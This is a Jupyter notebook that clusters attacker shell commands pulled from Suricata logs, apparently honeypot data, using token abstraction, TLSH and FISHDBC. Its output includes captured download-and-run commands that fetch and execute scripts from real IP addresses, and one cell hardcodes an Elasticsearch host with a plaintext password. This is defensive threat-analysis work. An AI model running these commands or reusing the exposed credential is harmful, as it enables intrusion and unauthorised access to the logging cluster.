In [15]:
from elasticsearch import Elasticsearch
import numpy as np
import pandas as pd
from collections import Counter, defaultdict
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from flexible_clustering import FISHDBC, hnsw_hdbscan
import tlsh
from elasticsearch import Elasticsearch
import pandas as pd
import numpy as np
from flexible_clustering import FISHDBC, plot_optics
from sklearn.preprocessing import LabelEncoder, StandardScaler
from sklearn.model_selection import train_test_split
import collections
import argparse
import Levenshtein
import matplotlib.pyplot as plt
import tlsh
import re
import json
import pandas as pd
pd.set_option("display.max_rows", None)
pd.set_option("display.max_columns", None)
pd.set_option('display.max_colwidth', None)
commands_df = pd.read_csv("commands_cleaned.csv")
# Clean up the command list (e.g. strip whitespace) and build a set for fast lookup.
valid_commands = set(commands_df["Command"].str.strip().unique())

In [16]:
# Connect to Elasticsearch cluster
es = Elasticsearch("https://elastic-eks.aee.vederelabs.net:443", basic_auth=("elastic",'0Tz9jmcWRq5j0kk774R421RD'))

# Check if the connection is successful
if es.ping():
    print("Connected to Elasticsearch!")
else:
    print("Could not connect to Elasticsearch.")

# Search for documents (retrieving data)
def search_document(query):
    response = es.search(body={"query": query},size=20)
    return response["hits"]["hits"]

Connected to Elasticsearch!


In [19]:
query = {
    "bool": {
      "must": [],
      "filter": [
        {
          "bool": {
            "filter": [
              {
                "bool": {
                  "should": [
                    {
                      "match": {
                        "type": "suricata"
                      }
                    }
                  ],
                  "minimum_should_match": 1
                }
              },
              {
                "bool": {
                  "should": [
                    {
                      "exists": {
                        "field": "payload_printable"
                      }
                    }
                  ],
                  "minimum_should_match": 1
                }
              },
              {
                "bool": {
                  "should": [
                    {
                      "multi_match": {
                        "type": "best_fields",
                        "query": "GET",
                        "lenient": true
                      }
                    },
                    {
                      "multi_match": {
                        "type": "best_fields",
                        "query": "POST",
                        "lenient": true
                      }
                    },
                    {
                      "multi_match": {
                        "type": "best_fields",
                        "query": "CONNECT",
                        "lenient": true
                      }
                    },
                    {
                      "multi_match": {
                        "type": "best_fields",
                        "query": "OPTIONS",
                        "lenient": true
                      }
                    },
                    {
                      "multi_match": {
                        "type": "best_fields",
                        "query": "DELETE",
                        "lenient": true
                      }
                    }
                  ],
                  "minimum_should_match": 1
                }
              }
            ]
          }
        },
        {
          "range": {
            "@timestamp": {
              "format": "strict_date_optional_time",
              "gte": "2020-08-21T00:00:00.000Z",
              "lte": "2025-04-01T10:21:57.231Z"
            }
          }
        }
      ],
      "should": [],
      "must_not": []
    }
  }

In [24]:
result = es.search(index="suricata-*", body=query_json)


BadRequestError: BadRequestError(400, 'parsing_exception', 'Unknown key for a START_OBJECT in [bool].')

In [21]:
query_json = json.dumps(query)

result = search_document(query_json)
  # Convert to a DataFrame
source_data = []

# Loop through each entry in 'result' and extract '_source'
for entry in result:
    source_data.append(entry['_source'])  # Extracting '_source' and adding it to the list

# Combine all '_source' data into a single DataFrame
df = pd.DataFrame(source_data)

/tmp/ipykernel_869376/3852769342.py:12: DeprecationWarning: Received 'size' via a specific parameter in the presence of a 'body' parameter, which is deprecated and will be removed in a future version. Instead, use only 'body' or only specific parameters.
  response = es.search(body={"query": query},size=20)


BadRequestError: BadRequestError(400, 'parsing_exception', 'Unknown key for a VALUE_STRING in [query].')

In [ ]:

# %%
# Use the 'message' field for clusterin

commands = df['payload_printable'].values

In [17]:
# Define Levenshtein distance
def levenshtein_distance(x, y):
    print("in lvev!")
    return Levenshtein.distance(x, y)

def jaccard_distance(x, y):
    set_x = set(x.split())
    set_y = set(y.split())
    intersection = len(set_x & set_y)
    union = len(set_x | set_y)
    if union == 0:
        return 1.0  # Max distance
    return 1 - intersection / union


def tlsh_distance(x, y):
    if len(x.strip()) <= 60 or len(y.strip()) <= 60:
        return jaccard_distance(x, y)

    hash_x = tlsh.hash(x.encode('utf-8'))
    hash_y = tlsh.hash(y.encode('utf-8'))

    # Skip if TLSH failed to compute a hash
    if hash_x == 'TNULL' or hash_y == 'TNULL':
        # print("Invalid TLSH hash, falling back to Levenshtein:")
        # print(x, ":", hash_x)
        # print(y, ":", hash_y)
        # print("-" * 60)
        return jaccard_distance(x, y)

    # Otherwise, compute TLSH diff
    return tlsh.diff(hash_x, hash_y)


def classify_argument(arg):
    """
    Classifies an argument as one of:
    COMMAND, URL, IP, HEX, PATH, FLAG, OPERATOR, FILE_EXECUTION, FILE_SCRIPT,
    VARIABLE, COMMAND_SUBSTITUTION, FILE, or STRING.
    """
    # Known commands or 'busybox' specifically
    if arg in valid_commands or arg in ('busybox', 'which'):
        return {'type': arg, 'value': arg}


    #not currently working: 
    # # Command substitution
    # if arg.startswith('$(') and arg.endswith(')'):
    #     return {'type': 'COMMAND_SUBSTITUTION', 'value': arg}

    # # Environment variable
    # if re.match(r'^\$\w+', arg):
    #     return {'type': 'VARIABLE', 'value': arg}

    # File execution (./file or similar patterns)
    if arg.startswith("./"):
        if arg.endswith('.sh'):
            return {'type': 'FILE_SCRIPT', 'value': arg}
        else:
            return {'type': 'FILE_EXECUTION', 'value': arg}

    # Preserve shell operators
    if arg in ('>', '>>', '&&', ';', '||', '|'):
        return {'type': 'OPERATOR', 'value': arg}

    # URLs
    if re.match(r'^https://', arg, flags=re.IGNORECASE):
        return {'type': 'SECURE_URL', 'value': arg}
    elif re.match(r'^http://', arg, flags=re.IGNORECASE):
        return {'type': 'URL', 'value': arg}

    # IP address
    if re.match(r'^\b\d{1,3}(?:\.\d{1,3}){3}\b$', arg):
        return {'type': 'IP', 'value': arg}

    # Hex escape
    if re.match(r'\\x[0-9a-fA-F]{2}', arg):
        return {'type': 'HEX', 'value': arg}

    # Files or paths
    if arg.startswith('/'):
        if arg.endswith('.sh'):
            return {'type': 'FILE_SCRIPT', 'value': arg}
        elif '.' in arg.split('/')[-1]:
            return {'type': 'FILE', 'value': arg}
        else:
            return {'type': 'PATH', 'value': arg}

    # Flags
    if arg.startswith('-'):
        return {'type': arg, 'value': arg}

    # Explicit file extension (e.g., file.txt)
    if '.' in arg:
        return {'type': 'FILE', 'value': arg}

    # Fallback
    return {'type': 'STRING', 'value': arg}


def abstract_command_line_substitution(cmd_line):
    """
    Transforms a shell command line by replacing each sub-command's arguments with generic placeholders.
    
    For example:
       "cat /proc/cpuinfo | grep name | wc -l" 
       becomes "cat PATH | grep STRING | wc FLAG"
       
    The first token (the command) is kept unchanged. Subsequent tokens are replaced based on:
      - tokens starting with '-'  -> "FLAG"
      - tokens starting with '/'  -> "PATH"
      - tokens starting with "http://" or "https://" -> "URL"
      - otherwise                -> "STRING"
      
    Operators (|, ||, &&, ;) are preserved.
    """
    # Split the command line on operators (keeping the operators)
    pattern = r'(\|\||&&|\||;)'
    parts = re.split(pattern, cmd_line)
    new_parts = []
    
    for part in parts:
        part = part.strip()
        if not part:
            continue
        # If the part is an operator, keep it as is.
        if part in ('||', '&&', '|', ';', '>', '>>'):
            new_parts.append(part)
        else:
            # Process sub-command: split into tokens.
            tokens = part.split()
            if not tokens:
                continue
            # The command (first token) remains unchanged.
            new_tokens = []
            # Replace subsequent tokens using classification.
            for token in tokens:
                placeholder = classify_argument(token)['type']
                new_tokens.append(placeholder)
            new_parts.append(" ".join(new_tokens))
    
    # Reassemble the parts with a space separator.
    return " ".join(new_parts)

In [18]:
abstracts = []
for i in commands:
    abstracts.append(abstract_command_line_substitution(i))

In [19]:
distance_func = lambda a, b: command_tokenwise_distance(a, b, similarity_matrix, threshold=0.1)

fishdbc = FISHDBC(distance_func)
fishdbc.update(abstracts)

In [20]:
# Cluster the commands.
_, _, _, ctree, _, _ = fishdbc.cluster()


# Organize clusters
clusters = collections.defaultdict(set)
for parent, child, lambda_val, child_size in ctree[::-1]:
    if child_size == 1:
        clusters[parent].add(child)
    else:
        assert len(clusters[child]) == child_size
        clusters[parent].update(clusters[child])
clusters = sorted(clusters.items())

In [21]:
# for cluster_id, members in clusters:
#     print(f"Cluster {cluster_id}:")

#     # Get all command strings in this cluster
#     member_cmds = [commands[member] for member in members]

#     # Count how many times each command appears
#     cmd_counts = Counter(member_cmds)

#     # Print commands sorted alphabetically with their count
#     for cmd in sorted(cmd_counts):
#         print(f"  - {cmd} ({cmd_counts[cmd]})")
    
#     # print("-" * 400)

child_to_parent = {}
for parent, child, _, _ in ctree:
    child_to_parent[child] = parent


for cluster_id, members in clusters:
    parent = child_to_parent.get(cluster_id, "ROOT")
    print(f"\nCluster {cluster_id} (Parent: {parent}):")

    # Get all command strings in this cluster
    member_cmds = [commands[member] for member in members]

    # Count how many times each command appears
    cmd_counts = Counter(member_cmds)

    # Print commands sorted alphabetically with their count
    for cmd in sorted(cmd_counts):
        print(f"  - {cmd} ({cmd_counts[cmd]})")

    print("-" * 80)



Cluster 10000 (Parent: ROOT):
  - ./1vHGRvVH (2)
  - ./DQdU3rkX (2)
  - ./GFC7c2I5 (2)
  - ./JOUM2ibo (2)
  - ./Ma44gOGl (2)
  - ./Xz4pqqfA (2)
  - ./mhS0XSvk (2)
  - ./tmFp5PJ6 (2)
  - ./xFFSzbdw (2)
  - /ip cloud print (16)
  - Enter new UNIX password: (285)
  - Enter new UNIX password:  (285)
  - break (1)
  - cat /proc/1 (3)
  - cat /proc/cpuinfo (8)
  - cat /proc/cpuinfo | grep model | grep name | wc -l (521)
  - cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' (520)
  - cat /proc/cpuinfo | grep name | wc -l (2036)
  - cat /proc/cpuinfo | grep name | wc -l | head -c 30 (7)
  - cat /proc/uptime (5)
  - cat /var/tmp/.systemcache436621 (2)
  - cat /var/tmp/.var03522123 | head -n 1 (3)
  - cd /data/local/tmp/; busybox wget http://163.123.142.131/w.sh; sh w.sh; curl http://163.123.142.131/c.sh; sh c.sh (27)
  - cd /data/local/tmp/; rm -rf w.sh c.sh; busybox wget http://185.112.83.86/w.sh; sh w.sh; curl http://185.112.83.86/c.sh; sh c.sh (3)
  - cd /data/loc

In [22]:
import pandas as pd
import numpy as np

# Load cosine similarity matrix
similarity_matrix = pd.read_csv("finalissimoSim.csv", index_col=0)



In [23]:
def group_commands_and_flags(abstract_cmd):
    tokens = abstract_cmd.strip().split()
    grouped = []
    skip_next = False

    for i, token in enumerate(tokens):
        if skip_next:
            skip_next = False
            continue

        classification = classify_argument(token)

        if classification['type'] == 'OPERATOR':
            continue  # Skip shell operators

        # If it's a flag and there's a command before it, attach it
        if token.startswith('-') and i > 0:
            prev_token = grouped.pop() if grouped else ''
            grouped.append(f"{prev_token} {token}")
            continue

        # Normal case
        grouped.append(token)

    return grouped

# def command_tokenwise_distance(cmd1, cmd2, similarity_matrix, threshold=0.1):
#     units1 = group_commands_and_flags(cmd1)
#     units2 = group_commands_and_flags(cmd2)

#     KNOWN_TYPES = {
#         'COMMAND', 'URL', 'IP', 'HEX', 'PATH', 'FLAG', 'OPERATOR',
#         'FILE_EXECUTION', 'FILE_SCRIPT', 'VARIABLE', 'COMMAND_SUBSTITUTION',
#         'FILE', 'STRING'
#     }

#     if len(units1) != len(units2):
#         return 1.0  # Different length

#     elif units1[0] in KNOWN_TYPES or units2[0] in KNOWN_TYPES:
#         return 1.0

#     for i in range(len(units1)):
#         u1 = units1[i]
#         u2 = units2[i]
#         # print(u1, "and", u2)

#         if len(u1) != len(u2):
#             continue
#         if u1 in KNOWN_TYPES or u2 in KNOWN_TYPES:
#             continue
#         elif u1 == u2:
#             continue
#         else:
#             try:
#                 sim = similarity_matrix[u1][u2]
#             except (ValueError, IndexError, KeyError) as e:
#                 # print(f"[WARN] Skipping unknown or out-of-bounds token: {u1}, {u2}")
#                 continue

#             if sim < threshold:
#                 return 1.0  # Not similar enough
                
#     return 0.0  # All passed


def split_by_operators(cmd):
    # This will keep operators in the result list
    return re.split(r'(\|\||&&|\||;)', cmd)

def command_tokenwise_distance(cmd1, cmd2, similarity_matrix, threshold=0.1):
    chunks1 = split_by_operators(cmd1)
    chunks2 = split_by_operators(cmd2)

    if len(chunks1) != len(chunks2):
        return 1.0  # different number of pipeline stages

    for c1, c2 in zip(chunks1, chunks2):
        c1 = c1.strip()
        c2 = c2.strip()

        # If this is a shell operator, check for equality
        if c1 in ('|', '||', '&&', ';'):
            if c1 != c2:
                return 1.0
            continue

        # Otherwise, it's a subcommand — apply your token-level comparison
        units1 = group_commands_and_flags(c1)
        units2 = group_commands_and_flags(c2)

        KNOWN_TYPES = {
            'COMMAND', 'URL', 'IP', 'HEX', 'PATH', 'FLAG', 'OPERATOR',
            'FILE_EXECUTION', 'FILE_SCRIPT', 'VARIABLE', 'COMMAND_SUBSTITUTION',
            'FILE', 'STRING'
        }

        if len(units1) != len(units2):
            return 1.0

        if units1[0] in KNOWN_TYPES or units2[0] in KNOWN_TYPES:
            return 1.0

        for u1, u2 in zip(units1, units2):
            if len(u1) != len(u2):
                continue
            if u1 in KNOWN_TYPES or u2 in KNOWN_TYPES:
                continue
            elif u1 == u2:
                continue
            else:
                try:
                    sim = similarity_matrix[u1][u2]
                except (ValueError, IndexError, KeyError):
                    continue

                if sim < threshold:
                    return 1.0  # Not similar enough

    return 0.0  # Everything matched well



In [24]:
similarity_matrix['wget -O']

label
awk                            0.000000
cat                            0.271088
cat -b                         0.142305
cat -n                         0.296796
cat -s                         0.138572
cd                             0.000000
chattr                         0.214218
chattr +a                      0.255593
chattr +i                      0.250145
chattr -i                      0.255593
crontab                        0.000000
crontab -e                     0.000000
crontab -l                     0.000000
crontab -r                     0.000000
curl                           0.716652
curl -X                        0.365667
curl -d                        0.365667
curl -o                        1.000000
curl -s                        0.652159
echo                           0.249522
echo -e                        0.128779
echo -n                        0.131535
free                           0.000000
free -g                        0.000000
free -h                        0.0